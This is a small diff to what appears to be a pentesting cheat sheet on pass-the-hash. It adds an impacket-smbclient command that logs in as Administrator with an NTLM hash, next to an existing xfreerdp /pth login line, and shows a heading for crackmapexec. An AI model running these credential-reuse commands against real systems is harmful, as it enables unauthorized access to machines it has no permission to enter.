@@ -53,6 +53,11 @@ xfreerdp /v:192.168.44.163 /u:Administrator /pth:<NTLM>
 ```
 
 
+using smbclient to login :
+```bash
+impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>
+```
+
 using crackmapexec :
 ```bash
 
